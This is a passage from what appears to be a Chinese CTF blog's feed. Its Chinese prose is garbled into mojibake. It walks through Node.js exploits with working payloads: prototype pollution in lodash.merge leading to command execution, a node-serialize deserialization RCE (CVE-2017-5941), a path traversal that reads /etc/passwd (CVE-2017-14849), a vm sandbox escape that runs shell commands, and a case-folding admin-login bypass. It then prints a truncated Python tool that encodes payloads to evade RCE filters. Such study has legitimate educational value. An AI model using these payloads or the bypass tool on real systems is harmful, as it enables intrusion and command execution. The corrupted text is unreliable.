å‡½æ•°ç”¨äºåˆå¹¶ä¸¤ä¸ªæ•°ç»„å†…å®¹åˆ°ç¬¬ä¸€ä¸ªæ•°ç»„ã€‚åœ¨æœ¬æ®µä»£ç çš„ä½œç”¨å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­</code></pre><p>éœ€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><p>åœ¨JSONè§£æçš„æƒ…å†µä¸‹ï¼Œ<code>__proto__</code>ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªçœŸæ­£çš„â€œé”®åâ€ï¼Œè€Œä¸ä»£è¡¨â€œåŸå‹â€ï¼Œæ‰€ä»¥åœ¨éå†object2çš„æ—¶å€™ä¼šå­˜åœ¨è¿™ä¸ªé”®ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸‹ï¼Œæœ‰å’Œæ²¡æœ‰JSONè§£æçš„åŒºåˆ«</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416001143881.png" alt="image-20220416001143881"></p><p>æ‰€ä»¥ä»£ç åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå­˜åœ¨è¿™ä¹ˆä¸€æ­¥</p><pre><code class="javascript">target[__proto__]=source[__proto__]å¯ç†è§£ä¸º  object.prototype = &#123;&quot;b&quot;: 2&#125; å¯¼è‡´äº†åŸå‹é“¾æ±¡æŸ“</code></pre><p>æœ€ç»ˆè¾“å‡ºçš„ç»“æœä¸ºï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416000830058.png" alt="image-20220416000830058"></p><p>å¯è§object3çš„bæ˜¯ä»åŸå‹ä¸­è·å–åˆ°çš„ï¼Œè¯´æ˜Objectå·²ç»è¢«æ±¡æŸ“äº†ã€‚</p><h2 id="Code-Breaking-2018-Thejs"><a href="#Code-Breaking-2018-Thejs" class="headerlink" title="Code-Breaking 2018 Thejs"></a>Code-Breaking 2018 Thejs</h2><p>é¢˜ç›®æºç ä¸‹è½½ï¼š<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><p>server.js</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p>é—®é¢˜å‡ºåœ¨lodash.merge()å‡½æ•°,è¿™ä¸ªå‡½æ•°å­˜åœ¨åŸå‹é“¾æ±¡æŸ“æ¼æ´ã€‚æˆ‘ä»¬å¾—å¯»æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚å› ä¸ºé€šè¿‡æ¼æ´å¯ä»¥æ§åˆ¶æŸä¸€ç§å®ä¾‹å¯¹è±¡åŸå‹çš„å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å»å¯»æ‰¾ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„å±æ€§ã€‚</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416004841823.png" alt="image-20220416004841823"></p><p>é¡µé¢æœ€ç»ˆä¼šé€šè¿‡lodash.templateè¿›è¡Œæ¸²æŸ“</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20220416005502144.png" alt="image-20220416005502144"></p><p>è·Ÿè¸ªåˆ°lodash/template.jsä¸­</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/QyN5JVOde3YL8aZ.png" alt="template_js.png"></p><p>å¦‚å›¾å¯ä»¥çœ‹åˆ°optionsæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ŒsourceURLæ˜¯é€šè¿‡ä¸‹é¢çš„è¯­å¥èµ‹å€¼çš„ï¼Œoptionsé»˜è®¤æ²¡æœ‰sourceURLå±æ€§ï¼Œæ‰€ä»¥sourceURLé»˜è®¤ä¹Ÿæ˜¯ä¸ºç©ºã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿç»™optionsçš„åŸå‹å¯¹è±¡åŠ ä¸€ä¸ªsourceURLå±æ€§ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶sourceURLçš„å€¼ã€‚</p><p>ç»§ç»­å¾€ä¸‹é¢çœ‹ï¼Œæœ€åsourceURLä¼ é€’åˆ°äº†Functionå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°å½“ä¸­ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/pwoVFrOyfzJX42M.png" alt="template_js01.png"></p><p>é€šè¿‡æ„é€ chile_process.exec()å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p><p>æœ€ç»ˆå¯ä»¥æ„é€ ä¸€ä¸ªç®€å•çš„Payloadä½œä¸ºä¼ é€’ç»™ä¸»é¡µé¢çš„çš„POSTæ•°æ®(windowsè°ƒç”¨è®¡ç®—å™¨)ï¼š</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(è¿™é‡Œç›´æ¥ç”¨requireä¼šæŠ¥é”™ï¼šReferenceError: require is not defined</p><p>pç¥ç»™äº†ä¸€ä¸ªæ›´å¥½çš„payloadï¼š</p><pre><code>&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h1 id="node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941"><a href="#node-serializeååºåˆ—åŒ–RCEæ¼æ´-CVE-2017-5941" class="headerlink" title="node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)"></a>node-serializeååºåˆ—åŒ–RCEæ¼æ´(CVE-2017-5941)</h1><p>æ¼æ´å‡ºç°åœ¨node-serializeæ¨¡å—0.0.4ç‰ˆæœ¬å½“ä¸­ï¼Œä½¿ç”¨<code>npm install node-serialize@0.0.4</code>å®‰è£…æ¨¡å—ã€‚</p><p><strong>äº†è§£ä»€ä¹ˆæ˜¯IIFEï¼š</strong></p><p>IIFE(ç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼)æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚</p><p>IIFEä¸€èˆ¬å†™æˆä¸‹é¢çš„å½¢å¼ï¼š</p><pre><code>(function()&#123; /* code */ &#125;());// æˆ–è€…(function()&#123; /* code */ &#125;)();</code></pre><ul><li><code>node-serialize@0.0.4</code>æ¼æ´ç‚¹</li></ul><p>æ¼æ´ä»£ç ä½äºnode_modules\node-serialize\lib\serialize.jsä¸­ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/aDr6o823Ux4F5Zw.png" alt="serialize_eval.png"></p><p>å…¶ä¸­çš„å…³é”®å°±æ˜¯ï¼š<code>obj[key] = eval(&#39;(&#39; + obj[key].substring(FUNCFLAG.length) + &#39;)&#39;);</code>è¿™ä¸€è¡Œè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°ä¼ é€’ç»™evalçš„å‚æ•°æ˜¯ç”¨æ‹¬å·åŒ…è£¹çš„ï¼Œæ‰€ä»¥å¦‚æœæ„é€ ä¸€ä¸ª<code>function()&#123;&#125;()</code>å‡½æ•°ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å°±ä¼šè¢«å½“ä¸­IIFEç«‹å³è°ƒç”¨æ‰§è¡Œã€‚æ¥çœ‹å¦‚ä½•æ„é€ payloadï¼š</p><p><strong>æ„é€ Payload</strong></p><pre><code class="javascript">serialize = require(&#39;node-serialize&#39;);var test = &#123; rce : function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;,&#125;console.log(&quot;åºåˆ—åŒ–ç”Ÿæˆçš„ Payload: \n&quot; + serialize.serialize(test));</code></pre><p>ç”Ÿæˆçš„Payloadä¸ºï¼š</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;&quot;&#125;</code></pre><p>å› ä¸ºéœ€è¦åœ¨ååºåˆ—åŒ–æ—¶è®©å…¶ç«‹å³è°ƒç”¨æˆ‘ä»¬æ„é€ çš„å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨ç”Ÿæˆçš„åºåˆ—åŒ–è¯­å¥çš„å‡½æ•°åé¢å†æ·»åŠ ä¸€ä¸ª<code>()</code>ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><pre><code class="javascript">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;</code></pre><p>(è¿™é‡Œä¸èƒ½ç›´æ¥åœ¨å¯¹è±¡å†…å®šä¹‰IIFEè¡¨è¾¾å¼ï¼Œä¸ç„¶ä¼šåºåˆ—åŒ–å¤±è´¥)</p><p>ä¼ é€’ç»™unserialize(æ³¨æ„è½¬ä¹‰å•å¼•å·)ï¼š</p><pre><code class="javascript">var serialize = require(&#39;node-serialize&#39;);var payload = &#39;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;,function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()&quot;&#125;&#39;;serialize.unserialize(payload);</code></pre><p>æ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œç»“æœå¦‚å›¾ï¼š</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/V1hOMYz7fQ3KB6X.png" alt="serialize_result.png"></p><h1 id="Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849"><a href="#Node-js-ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°-CVE-2017-14849" class="headerlink" title="Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)"></a>Node.js ç›®å½•ç©¿è¶Šæ¼æ´å¤ç°(CVE-2017-14849)</h1><p>æ¼æ´å½±å“çš„ç‰ˆæœ¬ï¼š</p><ul><li>Node.js 8.5.0 + Express 3.19.0-3.21.2</li><li>Node.js 8.5.0 + Express 4.11.0-4.15.5</li></ul><p>è¿è¡Œæ¼æ´ç¯å¢ƒï¼š</p><pre><code>cd vulhub/node/CVE-2017-14849/docker-compose builddocker-compose up -d</code></pre><p>ç”¨Burpsuiteè·å–åœ°å€ï¼š<code>/static/../../../a/../../../../etc/passwd</code> å³å¯ä¸‹è½½å¾—åˆ°<code>/etc/passwd</code>æ–‡ä»¶</p><p><img src="/2022/04/15/node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/L8pV6gXoAnJSRQ4.png" alt="node_dir.png"></p><h1 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h1><p>vmæ˜¯ç”¨æ¥å®ç°ä¸€ä¸ªæ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥å®‰å…¨çš„æ‰§è¡Œä¸å—ä¿¡ä»»çš„ä»£ç è€Œä¸ä¼šå½±å“åˆ°ä¸»ç¨‹åºã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ„é€ è¯­å¥æ¥è¿›è¡Œé€ƒé€¸ï¼š</p><p>é€ƒé€¸ä¾‹å­ï¼š</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`this.constructor.constructor(&#39;return this.process.env&#39;)()`);console.log(env);</code></pre><p>æ‰§è¡Œä¹‹åå¯ä»¥è·å–åˆ°ä¸»ç¨‹åºç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡</p><p>ä¸Šé¢ä¾‹å­çš„ä»£ç ç­‰ä»·äºå¦‚ä¸‹ä»£ç ï¼š</p><pre><code>const vm = require(&#39;vm&#39;);const sandbox = &#123;&#125;;const script = new vm.Script(&quot;this.constructor.constructor(&#39;return this.process.env&#39;)()&quot;);const context = vm.createContext(sandbox);env = script.runInContext(context);console.log(env);</code></pre><p>åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œé¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ sandboxï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontextï¼Œvm è„šæœ¬ä¸­å…¨å±€ this æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡ã€‚</p><p>å› ä¸º<code>this.constructor.constructor</code>è¿”å›çš„æ˜¯ä¸€ä¸ª<code>Function constructor</code>ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨Functionå¯¹è±¡æ„é€ ä¸€ä¸ªå‡½æ•°å¹¶æ‰§è¡Œã€‚(æ­¤æ—¶Functionå¯¹è±¡çš„ä¸Šä¸‹æ–‡ç¯å¢ƒæ˜¯å¤„äºä¸»ç¨‹åºä¸­çš„) è¿™é‡Œæ„é€ çš„å‡½æ•°å†…çš„è¯­å¥æ˜¯<code>return this.process.env</code>ï¼Œç»“æœæ˜¯è¿”å›äº†ä¸»ç¨‹åºçš„ç¯å¢ƒå˜é‡ã€‚</p><p>é…åˆ<code>chile_process.exec()</code>å°±å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤äº†ï¼š</p><pre><code>const vm = require(&quot;vm&quot;);const env = vm.runInNewContext(`const process = this.constructor.constructor(&#39;return this.process&#39;)();process.mainModule.require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()`);console.log(env);</code></pre><p>æœ€è¿‘çš„mongo-express RCE(CVE-2019-10758)æ¼æ´å°±æ˜¯é…åˆvmæ²™ç®±é€ƒé€¸æ¥åˆ©ç”¨çš„ã€‚</p><p>å…·ä½“åˆ†æå¯å‚è€ƒï¼š<a href="https://xz.aliyun.com/t/7056">CVE-2019-10758:mongo-expressRCEå¤ç°åˆ†æ</a></p><h1 id="javascriptå¤§å°å†™ç‰¹æ€§"><a href="#javascriptå¤§å°å†™ç‰¹æ€§" class="headerlink" title="javascriptå¤§å°å†™ç‰¹æ€§"></a>javascriptå¤§å°å†™ç‰¹æ€§</h1><p>åœ¨javascriptä¸­æœ‰å‡ ä¸ªç‰¹æ®Šçš„å­—ç¬¦éœ€è¦è®°å½•ä¸€ä¸‹</p><p>å¯¹äºtoUpperCase():</p><pre><code>å­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot; ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º &quot;I&quot;ã€&quot;S&quot;</code></pre><p>å¯¹äºtoLowerCase():</p><pre><code>å­—ç¬¦&quot;â„ª&quot;ç»è¿‡toLowerCaseå¤„ç†åç»“æœä¸º&quot;k&quot;(è¿™ä¸ªâ„ªä¸æ˜¯K)</code></pre><p>åœ¨ç»•ä¸€äº›è§„åˆ™çš„æ—¶å€™å°±å¯ä»¥åˆ©ç”¨è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œç»•è¿‡</p><p><strong>CTFé¢˜å®ä¾‹ - Hacktmä¸­çš„ä¸€é“Nodejsé¢˜</strong></p><p>é¢˜ç›®éƒ¨åˆ†æºç ï¼š</p><pre><code class="javascript">function isValidUser(u) &#123;  return (    u.username.length &gt;= 3 &amp;&amp;    u.username.toUpperCase() !== config.adminUsername.toUpperCase()  );&#125;function isAdmin(u) &#123;  return u.username.toLowerCase() == config.adminUsername.toLowerCase();&#125;</code></pre><p>è§£é¢˜æ—¶éœ€è¦ç™»å½•ç®¡ç†å‘˜çš„ç”¨æˆ·åï¼Œä½†æ˜¯åœ¨ç™»å½•æ—¶ï¼Œ<code>isValidUser</code>å‡½æ•°ä¼šå¯¹ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åè¿›è¡Œ<code>toUpperCase</code>å¤„ç†ï¼Œå†ä¸ç®¡ç†å‘˜ç”¨æˆ·åè¿›è¡Œå¯¹æ¯”ã€‚å¦‚æœè¾“å…¥çš„ç”¨æˆ·åä¸ç®¡ç†å‘˜ç”¨æˆ·åç›¸åŒï¼Œå°±ä¸å…è®¸ç™»å½•ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ä¹‹åçš„ä¸€ä¸ªåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜çš„å‡½æ•°ä¸­ï¼Œå¯¹ç”¨æˆ·åè¿›è¡Œå¤„ç†çš„æ˜¯<code>toLowerCase</code>ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªå·®å¼‚ï¼Œå°±å¯ä»¥ä½¿ç”¨å¤§å°å†™ç‰¹æ€§æ¥è¿›è¡Œç»•è¿‡ã€‚</p><p>é¢˜ç›®ä¸­é»˜è®¤çš„ç®¡ç†å‘˜ç”¨æˆ·åä¸ºï¼šhacktm</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æŒ‡å®šç™»å½•æ—¶çš„ç”¨æˆ·åä¸ºï¼šhacâ„ªtm å³å¯ç»•è¿‡<code>isValidUser</code>å’Œ<code>isAdmin</code>çš„éªŒè¯ã€‚</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;a href=&quot;#å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ&quot; class=&quot;headerlink&quot; title=&quot;å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ&quot;&gt;&lt;/a&gt;å±é™©å‡½æ•°æ‰€å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œ&lt;/h1&gt;&lt;h2 id=&quot;eval&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="å¸¸è§æ¼æ´å’Œæ‰‹æ³•" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="node.js" scheme="https://sakurahack-y.github.io/tags/node-js/"/>
    
  </entry>
  
  <entry>
    <title>rceå¸¸ç”¨è„šæœ¬</title>
    <link href="https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/"/>
    <id>https://sakurahack-y.github.io/2022/04/12/rce%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC/</id>
    <published>2022-04-11T17:16:30.000Z</published>
    <updated>2022-04-11T17:17:22.381Z</updated>
    
    <content type="html"><![CDATA[<p>å¾ˆå¥½ç”¨ï¼Œå„ç§ç»•è¿‡å§¿åŠ¿</p><pre><code class="python">from typing import finalimport stringdef realHex(num):    if num &lt;16:        return &quot;%0&quot;+hex(num)[2:]    else:        return &#39;%&#39;+hex(num)[2:]pattern=input(&quot;è¯·è¾“å…¥æ­£åˆ™è¿‡æ»¤å¼,æ²¡æœ‰åˆ™ç›´æ¥å›è½¦è·³è¿‡\n&quot;)#æ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦re.Iå¤§å°å†™ä¸æ•æ„Ÿ,re.Må¤šè¡ŒåŒ¹é…,å½±å“^å’Œ$,re.Sä½¿å¾—.åŒ¹é…åŒ…æ‹¬æ¢è¡Œåœ¨å†…çš„æ‰€æœ‰å­—ç¬¦,re.Uæ ¹æ®Unicodeå­—ç¬¦é›†è§£æå­—ç¬¦,å½±å“\w,\W,\b,\B#å»ºè®®å›è½¦è·³è¿‡,è¿™ä¸ªåŠŸèƒ½å¾ˆé€Šif pattern != &quot;&quot;:    import re    blacklist=[&quot;`&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]    for i in range(32,255):        if  re.search(pattern,chr(i),re.I):            blacklist.append(chr(i))else:    #blackliståˆ—è¡¨ä¸­çš„å­—ç¬¦åœ¨ç”Ÿæˆçš„æ‹¼æ¥å­—ç¬¦ä¸²ä¸­ä¸ä¼šè¢«ä½¿ç”¨,é™¤äº†éƒ¨åˆ†æ˜¯è¢«è¿‡æ»¤æ‰çš„å­—ç¬¦ï¼Œå…¶ä½™çš„å¦‚&#39;,&quot;ç­‰å­—ç¬¦è€ƒè™‘å¯èƒ½ä¼šå¯¼è‡´é—­åˆç­‰é—®é¢˜æš‚åˆ—å…¥    #å¦‚æœæœ‰å…¶ä»–çš„è¦æ±‚å¯ä»¥å¯¹blackliståˆ—è¡¨è¿›è¡Œåˆ æ”¹    #!æ³¨æ„å¯¹äº|å’Œ&amp;æ¥è¯´æ‹¼å‡‘å­—ç¬¦æ˜¯ç›¸å½“å›°éš¾çš„,å¹¶ä¸”å¯ç”¨èŒƒå›´å®é™…ä¸Šæ˜¯31-255,è¿™å°±å¯¼è‡´äº†è¦è¿™æ ·ç”¨å¿…é¡»å¼•å·åŒ…è£¹,å¦åˆ™å¤§æ¦‚ç‡GG    #æ¯”å¦‚&#123;,&#125;,;,|,&amp;,$ç­‰è¯¸å¤šç¬¦å·ä¸å¸¦å¼•å·ä¼šå¯¼è‡´æ— æ³•ä½¿ç”¨    blacklist=[]    for word in string.ascii_letters+string.digits:        blacklist.append(word)    blacklist+=[&quot; &quot;,&quot;^&quot;,&quot;~&quot;,&quot;|&quot;,&quot;&#39;&quot;,&#39;&quot;&#39;,&quot;\\&quot;]#print(blacklist)#ä¸åŒäºå–å,ä¸€ä¸ªç›®æ ‡å­—ç¬¦ä¸²ä½¿ç”¨å¼‚æˆ–çš„æ–¹å¼å¯ä»¥è·å¤§é‡çš„å¯ç”¨æ‹¼æ¥å­—ç¬¦ä¸²,è¿™é‡Œåªå–äº†1ç§ç»„åˆçš„æ‹¼æ¥å­—ç¬¦ä¸²#å¦‚æœéœ€è¦è·å¾—æ›´å¤šæ‹¼æ¥å­—ç¬¦ä¸²æŸ¥çœ‹è¯¥å‡½æ•°ä¸­çš„resultåˆ—è¡¨def yiHuo(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;&quot;&quot;^&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #è¿™é‡Œæ›´æ¢èŒƒå›´        for i in range(1,255):           if(chr(i) not in blacklist):               #è¿™é‡Œæ›´æ¢èŒƒå›´                for j in range(1,255):                    if(chr(j) not in blacklist):                        if(i^j==ord(rawstr[k]) and [hex(j).replace(&#39;0x&#39;,&quot;%&quot;),hex(i).replace(&#39;0x&#39;,&quot;%&quot;)] not in result[k]):                            result[k].extend([[realHex(i),realHex(j)]])    #åœ¨è¿™é‡Œå¾€ä¸‹çš„å‡½æ•°éƒ¨åˆ†,resultåˆ—è¡¨å‡æ˜¯å¯ç”¨çš„(å·²å¡«å……äº†è·å¾—çš„æ‹¼æ¥å­—ç¬¦ä¸²)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.find(&quot;^&quot;,0)-1]+result[i][0][0]+&#39;&quot;&#39;+finalstr[finalstr.find(&quot;^&quot;,0):]        finalstr=finalstr[:finalstr.rfind(&quot;&#39;&quot;,0)]+result[i][0][1]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef quFan(string):    global operationEffient    global blacklist    operationEffient=False    result=[]    finalstr=&#39;~&quot;&quot;&#39;    rawstr=string    for i in range(0,len(rawstr)):        result.extend([[]])    for k in range(0,len(rawstr)):        #è¿™é‡Œæ›´æ¢èŒƒå›´        for i in range(1,255):           if(chr(i) not in blacklist and chr(int(bin(~i &amp; 0xFF)[2:],2))==rawstr[k]):               result[k].extend([realHex(i)])    #print(result)    for i in range(0,len(result)):        if(len(result[i])==0):            return(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstr[i]))    for i in range(0,len(rawstr)):        finalstr=finalstr[:finalstr.rfind(&#39;&quot;&#39;,0)]+result[i][0]+finalstr[finalstr.rfind(&#39;&quot;&#39;,0):]    return finalstrdef rce_and(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i&amp;j)==rawstring[l]:                    #æ³¨æ„&amp;åœ¨URLç‰¹æ®Šå«ä¹‰,æ•…éœ€è¦URLç¼–ç                     result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;%26\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrdef rce_or(string):    global operationEffient    global blacklist    operationEffient=False    rawstring=string    result=[]    finalstr=&quot;&quot;    for i in range(0,len(rawstring)):        result.extend([[]])    for l in range(0,len(rawstring)):        for i in range(1,255):            for j in range(1,255):                if (chr(j) in blacklist) or (chr(i) in blacklist):                    continue                if chr(i|j)==rawstring[l]:                    result[l].append(&quot;\&quot;&quot;+realHex(i)+&quot;\&quot;|\&quot;&quot;+realHex(j)+&quot;\&quot;&quot;)                    continue    for i in range(0,len(result)):        if(len(result[i])==0):            print(&quot;è¯¥å­—ç¬¦åœ¨ç°æœ‰é»‘åå•å’Œå­—ç¬¦èŒƒå›´ä¸‹æ— æ³•æ‹¼æ¥å‡º-&gt;%s&quot;%(rawstring[i]))            return    for i in range(0,len(result)):        if i == 0:            finalstr+=&quot;(&#123;&#125;)&quot;.format(result[i][0])        else:            finalstr+=&quot;.(&#123;&#125;)&quot;.format(result[i][0])    return finalstrwhile(True):    operationEffient=True    target=input(&quot;è¯·è¾“å…¥å¾…è½¬æ¢å­—ç¬¦\n&quot;)    while(operationEffient):        operation=input(&quot;è¯·é€‰æ‹©æ“ä½œ\n0-&gt;é‡æ–°è¾“å…¥\n1-&gt;ä½¿ç”¨å¼‚æˆ–æ‹¼æ¥\n2-&gt;ä½¿ç”¨å–åè·å¾—\n3-&gt;ä½¿ç”¨äºŒè¿›åˆ¶å’Œ\n4-&gt;ä½¿ç”¨äºŒè¿›åˆ¶æˆ–\n&quot;)        if(operation==&quot;1&quot;):            result=yiHuo(target)            pass        